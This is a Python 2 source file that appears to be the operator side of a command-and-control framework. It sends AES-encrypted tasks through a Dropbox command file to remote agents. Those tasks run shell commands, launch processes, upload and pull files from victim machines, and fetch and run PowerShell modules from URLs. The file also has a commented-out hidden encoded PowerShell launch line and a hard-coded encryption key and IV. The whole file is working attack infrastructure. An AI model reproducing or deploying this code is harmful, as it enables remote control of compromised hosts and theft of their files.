import config as cfg
import pkcs7,threading, base64
import os.path
from Crypto.Cipher import AES
from pkcs7 import PKCS7Encoder
from lib import helpers
from lib import stagers
from lib.crypto import Crypto

#****************************************************************************************
# Class handling high level interactions with agents
#****************************************************************************************

key = 'secret#456!23key'
iv  = 'Key@123Key@123fd'

class AgentHandler:
        """ This class provides all functions to task remote agents
        """
        #------------------------------------------------------------------------------------
        def __init__(self, dropboxHandler, statusHandler):
                self.dropboxHandler = dropboxHandler
                self.statusHandler = statusHandler
                self.agentID = None
	
	#------------------------------------------------------------------------------------
	def taskAgentWithCLI(self, cmd):
		global key
		global iv
		# Create a task
		task = self.statusHandler.createTask(self.agentID, "runCLI", args = [cmd])
		# Prepare the task format, then put the task into the command file
		data = "runCLI\n{}\n{}\n{}\n{}".format(task['id'], cmd, helpers.randomString(16), "")
		aes = AES.new(key, AES.MODE_CBC, iv)
		encoder = PKCS7Encoder()
		pad_text = encoder.encode(data)
		cipher = aes.encrypt(pad_text)
		decodedData = base64.b64encode(cipher)
		r = self.dropboxHandler.putFile(self.statusHandler.getAgentAttribute(self.agentID, 'commandFile'), decodedData)

		if r is not None:
			# Commit this task for the current agent
			self.statusHandler.commitTask(task)
			print helpers.color("[+] Agent with ID [{}] has been tasked with task ID [{}]".format(self.agentID, task['id']))
		else:
			print helpers.color("[!] Error tasking agent with ID [{}]".format(self.agentID))

 	#------------------------------------------------------------------------------------
        def taskAgentWithShell(self, cmd):
		global key
                global iv
                # Prepare the task format, then put the task into the command file
                data = "shell\n{}\n{}\n{}\n{}".format("n/a",cmd,helpers.randomString(16),"")
		aes = AES.new(key, AES.MODE_CBC, iv)
                encoder = PKCS7Encoder()
                pad_text = encoder.encode(data)
                cipher = aes.encrypt(pad_text)
                decodedData = base64.b64encode(cipher)

                r = self.dropboxHandler.putFile(self.statusHandler.getAgentAttribute(self.agentID, 'commandFile'), decodedData)

                if r is not None:
                        print helpers.color("[+] Agent with ID [{}] has been tasked with shell command".format(self.agentID))
                else:
                        print helpers.color("[!] Error tasking agent with ID [{}]".format(self.agentID))




	#------------------------------------------------------------------------------------
	def taskAgentWithLaunchProcess(self, exePath, parameters):
		# Create a task
		task = self.statusHandler.createTask(self.agentID, "launchProcess", args = [exePath, parameters])

		# Prepare the task format, then put the task into the command file
		data = "launchProcess\n{}\n{}\n{}\n{}".format(task['id'],exePath, parameters,helpers.randomString(16))
		aes = AES.new(key, AES.MODE_CBC, iv)
		encoder = PKCS7Encoder()
		pad_text = encoder.encode(data)
		cipher = aes.encrypt(pad_text)
		decodedData = base64.b64encode(cipher)
		r = self.dropboxHandler.putFile(self.statusHandler.getAgentAttribute(self.agentID, 'commandFile'), decodedData)

		if r is not None:
			# Commit this task for the current agent
			self.statusHandler.commitTask(task)
			print helpers.color("[+] Agent with ID [{}] has been tasked with task ID [{}]".format(self.agentID, task['id']))
		else:
			print helpers.color("[!] Error tasking agent with ID [{}]".format(self.agentID))


	#------------------------------------------------------------------------------------

	def taskAgentWithSendFile(self, localFile, destinationPath):
		# Creating the remote file path (used on the DropBox API server)
		fileName = os.path.basename(localFile)
		remoteFilePath = "/" + self.agentID + ".rsc"

		# First upload the localFile to DropBox
		try:
			with open(localFile) as fileHandle:
				print helpers.color("[*] Uploading file [{}] to [{}]".format(localFile, remoteFilePath))
				r = self.dropboxHandler.putFile(remoteFilePath, fileHandle.read())
				fileHandle.close()

				if r is None:
					return
		except IOError:
			print helpers.color("[!] Could not open or read file [{}]".format(localFile))
			return

		# Once the local file is properly uploaded, proceed with tasking the agent
		# Create a task
		task = self.statusHandler.createTask(self.agentID, "sendFile", args = [localFile, destinationPath])
		# Prepare the task format, then put the task into the command file
		data = "downloadFile\n{}\n{}\n{}\n{}\n{}".format(task['id'], remoteFilePath, destinationPath, fileName, helpers.randomString(16))

		aes = AES.new(key, AES.MODE_CBC, iv)
                encoder = PKCS7Encoder()
                pad_text = encoder.encode(data)
                cipher = aes.encrypt(pad_text)
                decodedData = base64.b64encode(cipher)

		r = self.dropboxHandler.putFile(self.statusHandler.getAgentAttribute(self.agentID, 'commandFile'), decodedData)

		if r is not None:
			# Commit this task for the current agent
			self.statusHandler.commitTask(task)
			print helpers.color("[+] Agent with ID [{}] has been tasked with task ID [{}]".format(self.agentID, task['id']))
		else:
			print helpers.color("[!] Error tasking agent with ID [{}]".format(self.agentID))



	#------------------------------------------------------------------------------------
	def taskAgentWithGetFile(self, agentLocalFile):
			
		# Create a task
		task = self.statusHandler.createTask(self.agentID, "getFile", args = [agentLocalFile])
		
		# Prepare the task format, then put the task into the command file
		data = "sendFile\n{}\n{}\n{}".format(task['id'], agentLocalFile, helpers.randomString(16))
		
		aes = AES.new(key, AES.MODE_CBC, iv)
                encoder = PKCS7Encoder()
                pad_text = encoder.encode(data)
                cipher = aes.encrypt(pad_text)
                decodedData = base64.b64encode(cipher)
		
		r = self.dropboxHandler.putFile(self.statusHandler.getAgentAttribute(self.agentID, 'commandFile'), decodedData)
		
		if r is not None:
			# Commit this task for the current agent
			self.statusHandler.commitTask(task)
			print helpers.color("[+] Agent with ID [{}] has been tasked with task ID [{}]".format(self.agentID, task['id']))
		else:
			print helpers.color("[!] Error tasking agent with ID [{}]".format(self.agentID))
	


	#------------------------------------------------------------------------------------
	def taskAgentWithRunPSModule(self, moduleName, moduleArgs=None, interact = False):

		# Construct the powershell code from a template, substituting palceholders with proper parameters
		parameters = {'moduleURL': self.statusHandler.publishedModuleList[moduleName],'moduleName': moduleName}
		poshCmd = helpers.convertFromTemplate(parameters, cfg.defaultPath['runPSModuleTpl'])
		if poshCmd == None: return

		# Add module arguments if ever
		if moduleArgs:
			poshCmd += ";Write-Host \"-> Executing module arguments\";{}".format(moduleArgs)

		# If we want to interact with the PowerShell CLI once the module is loaded, switch to 'shell' mode
		if interact:
			self.taskAgentWithShell(poshCmd)
		else:
			task = self.statusHandler.createTask(self.agentID, "runPSModule", args = [moduleName, moduleArgs])

			# Turn the powershell code into a suitable powershell base64 encoded one line command
			# base64Payload = helpers.powershellEncode(poshCmd)

			# Create the final command
			# cmd = "powershell.exe -NoP -sta -NonI -Enc {}".format(base64Payload)
			cmd = poshCmd
			# Prepare the task format, then put the task into the command file
			data = "runPS\n{}\n{}\n{}".format(task['id'],cmd,helpers.randomString(16))

			aes = AES.new(key, AES.MODE_CBC, iv)
	                encoder = PKCS7Encoder()
	                pad_text = encoder.encode(data)
	                cipher = aes.encrypt(pad_text)
                	decodedData = base64.b64encode(cipher)

			r = self.dropboxHandler.putFile(self.statusHandler.getAgentAttribute(self.agentID, 'commandFile'), decodedData)

			if r is not None:
				# Commit this task for the current agent
				self.statusHandler.commitTask(task)
				print helpers.color("[+] Agent with ID [{}] has been tasked with task ID [{}]".format(self.agentID, task['id']))
			else:
				print helpers.color("[!] Error tasking agent with ID [{}]".format(self.agentID))
